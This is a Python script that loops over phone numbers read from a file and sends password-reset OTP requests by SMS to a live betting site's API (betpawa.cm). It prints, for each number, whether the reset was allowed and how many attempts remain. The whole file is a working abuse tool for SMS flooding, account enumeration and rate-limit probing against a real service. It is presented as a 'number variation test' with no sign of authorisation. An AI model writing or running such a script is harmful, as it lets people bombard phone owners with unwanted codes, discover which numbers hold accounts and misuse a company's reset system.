import os
import requests

url = "https://www.betpawa.cm/api/user/v3/password/request-otp"

headers = {
    "User-Agent": "Mozilla/5.0",
    "Content-Type": "application/json",
    "X-Pawa-Brand": "betpawa-cameroon",
    "X-Pawa-Language": "en"
}

# Check if the file exists before trying to open it
file_path = "abang.txt"
if not os.path.exists(file_path):
    print(f"Error: {file_path} not found. Please create it first.")
    exit(1)

# Open the file and read lines, stripping whitespace/newlines
with open(file_path, "r") as file:
    test_numbers = [line.strip() for line in file if line.strip()]

session = requests.Session()

print(f"=== NUMBER VARIATION TEST ({len(test_numbers)} numbers loaded) ===\n")

for num in test_numbers:
    payload = {
        "phoneNumber": num,
        "resetMethodName": "SMS"
    }

    r = session.post(url, headers=headers, json=payload)

    try:
        data = r.json()
    except:
        data = {}

    limit = data.get("limit", {})
    allowed = limit.get("allowed")
    attempts_left = limit.get("attemptsLeft")

    print(f"Number: {num}")
    print("Status:", r.status_code)
    print("Allowed:", allowed)
    print("Attempts Left:", attempts_left)
    print("-" * 40)
